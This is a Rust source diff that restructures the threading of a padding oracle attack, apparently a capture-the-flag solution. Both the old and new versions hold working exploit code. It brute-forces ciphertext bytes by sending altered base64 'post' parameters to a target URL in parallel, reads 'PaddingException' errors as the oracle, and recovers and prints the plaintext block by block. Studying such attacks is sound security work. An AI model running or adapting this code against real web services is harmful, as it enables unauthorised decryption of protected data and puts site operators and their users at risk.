@@ -94,119 +94,122 @@ fn main() -> Result<()> {
     let len = chunks.len();
     let mut plaintext: Vec<Vec<u8>> = vec![];
     let url = Arc::new(args.url.clone());
-    let finished_condvar = Arc::new(Condvar::new());
-    let finished_b: Arc<Mutex<Option<u8>>> = Arc::new(Mutex::new(None));
-    let generation = Arc::new(Mutex::new(1u8));
-    for chunk in 2..=10 {
-        let mut intermediates = [0u8; 16];
-        chunks = orig_chunks.clone();
-        for i in 1u8..=16 {
-            *(generation.lock().unwrap()) = i;
-            println!("chunk: #{}", len - chunk);
-            println!("i: {i}");
-            let mut handles = vec![];
-            let semaphore = Arc::new(Semaphore::new(30));
-            for b in 0u8..=255 {
-                let url = url.clone();
-                let mut chunks = chunks.clone();
-                let client = client.clone();
-                let semaphore = semaphore.clone();
-                let finished_condvar = finished_condvar.clone();
-                let finished_b = finished_b.clone();
-                let generation = generation.clone();
 
-                let handle = std::thread::spawn(move || {
-                    chunks[len - chunk][16 - i as usize] = b;
-                    if chunks[len - chunk] == orig_chunks[len - chunk] {
-                        return;
-                    }
-                    // println!(
-                    //     "{:x?}",
-                    //     chunks
-                    //         .clone()
-                    //         .into_iter()
-                    //         .skip(8)
-                    //         .flatten()
-                    //         .collect::<Vec<_>>()
-                    // );
-                    let encoded = BASE64_STANDARD
-                        .encode(
-                            chunks
-                                .clone()
-                                .into_iter()
-                                .skip(len - chunk)
-                                .take(2)
-                                .flatten()
-                                .collect::<Vec<_>>(),
-                        )
-                        .replace('=', "~")
-                        .replace('/', "!")
-                        .replace('+', "-");
-                    let guard = semaphore.start();
-                    let res = client
-                        .get(url.as_str())
-                        .query(&[("post", encoded)])
-                        .send()
-                        .unwrap();
-                    drop(guard);
-                    if *(generation.lock().unwrap()) != i {
-                        return;
-                    }
-                    let text = res.text().unwrap();
-                    if text.contains("PaddingException") {
-                        print!("{b} ");
-                        io::stdout().flush().unwrap();
-                    } else {
-                        println!("\n{b} {text}");
-                        if text.contains("UnicodeDecodeError")
-                            || text.contains("ValueError")
-                            || i != 1
-                        {
-                            *(finished_b.lock().unwrap()) = Some(b);
-                            finished_condvar.notify_one();
+    let finished = Arc::new((Mutex::new(None::<u8>), Condvar::new()));
+    let generation = Mutex::new(1u8);
+    std::thread::scope(|scope| -> Result<()> {
+        for chunk in 2..=10 {
+            let mut intermediates = [0u8; 16];
+            chunks = orig_chunks.clone();
+            for i in 1u8..=16 {
+                *(generation.lock().unwrap()) = i;
+                println!("chunk: #{}", len - chunk);
+                println!("i: {i}");
+                let mut handles = vec![];
+                let semaphore = Arc::new(Semaphore::new(30));
+                for b in 0u8..=255 {
+                    let url = url.clone();
+                    let mut chunks = chunks.clone();
+                    let client = client.clone();
+                    let semaphore = semaphore.clone();
+                    let finished = finished.clone();
+                    let generation = &generation;
+                    let orig_chunks = orig_chunks.clone();
+                    let handle = scope.spawn(move || {
+                        chunks[len - chunk][16 - i as usize] = b;
+                        if chunks[len - chunk] == orig_chunks[len - chunk] {
+                            return;
                         }
-                    }
-                });
+                        // println!(
+                        //     "{:x?}",
+                        //     chunks
+                        //         .clone()
+                        //         .into_iter()
+                        //         .skip(8)
+                        //         .flatten()
+                        //         .collect::<Vec<_>>()
+                        // );
+                        let encoded = BASE64_STANDARD
+                            .encode(
+                                chunks
+                                    .clone()
+                                    .into_iter()
+                                    .skip(len - chunk)
+                                    .take(2)
+                                    .flatten()
+                                    .collect::<Vec<_>>(),
+                            )
+                            .replace('=', "~")
+                            .replace('/', "!")
+                            .replace('+', "-");
+                        let guard = semaphore.start();
+                        let res = client
+                            .get(url.as_str())
+                            .query(&[("post", encoded)])
+                            .send()
+                            .unwrap();
+                        drop(guard);
+                        if *(generation.lock().unwrap()) != i {
+                            return;
+                        }
+                        let text = res.text().unwrap();
+                        if text.contains("PaddingException") {
+                            print!("{b} ");
+                            io::stdout().flush().unwrap();
+                        } else {
+                            println!("\n{b} {text}");
+                            if text.contains("UnicodeDecodeError")
+                                || text.contains("ValueError")
+                                || i != 1
+                            {
+                                let (finished_b, finished_condvar) = &*finished;
+                                *(finished_b.lock().unwrap()) = Some(b);
+                                finished_condvar.notify_one();
+                            }
+                        }
+                    });
 
-                handles.push(handle);
-            }
-
-            let mut b_guard = finished_b.lock().unwrap();
-            while (*b_guard).is_none() {
-                b_guard = finished_condvar.wait(b_guard).unwrap();
-            }
-            let b = (*b_guard).take();
-            drop(b_guard);
-            if let Some(b) = b {
-                // then continue here with the loop
-                intermediates[16 - i as usize] = b ^ i;
-                let second_last = chunks.get_mut(len - chunk).unwrap();
-                println!("{second_last:x?}");
-                for x in 1..=i {
-                    second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
+                    handles.push(handle);
                 }
-                println!("{second_last:x?}");
-                continue;
-            } else {
-                panic!()
+
+                let (finished_b, finished_condvar) = &*finished.clone();
+                let mut b_guard = finished_b.lock().unwrap();
+                while (*b_guard).is_none() {
+                    b_guard = finished_condvar.wait(b_guard).unwrap();
+                }
+                let b = (*b_guard).take();
+                drop(b_guard);
+                if let Some(b) = b {
+                    // then continue here with the loop
+                    intermediates[16 - i as usize] = b ^ i;
+                    let second_last = chunks.get_mut(len - chunk).unwrap();
+                    println!("{second_last:x?}");
+                    for x in 1..=i {
+                        second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
+                    }
+                    println!("{second_last:x?}");
+                    continue;
+                } else {
+                    panic!()
+                }
+            }
+
+            println!("{:x?}", intermediates);
+            let newplaintext: Vec<u8> = intermediates
+                .iter()
+                .zip(orig_chunks.get(len - chunk).unwrap().iter())
+                .map(|(&x1, &x2)| x1 ^ x2)
+                .collect();
+            plaintext.push(newplaintext);
+            println!("{:?}", plaintext);
+
+            if chunk == 10 {
+                plaintext.reverse();
+                println!("{}", String::from_utf8(plaintext.concat())?);
             }
         }
-
-        println!("{:x?}", intermediates);
-        let newplaintext: Vec<u8> = intermediates
-            .iter()
-            .zip(orig_chunks.get(len - chunk).unwrap().iter())
-            .map(|(&x1, &x2)| x1 ^ x2)
-            .collect();
-        plaintext.push(newplaintext);
-        println!("{:?}", plaintext);
-
-        if chunk == 10 {
-            plaintext.reverse();
-            println!("{}", String::from_utf8(plaintext.concat())?);
-        }
-    }
-
+        Ok(())
+    })?;
     // plaintext.reverse();
     // println!("{}", String::from_utf8(plaintext.concat())?);
 
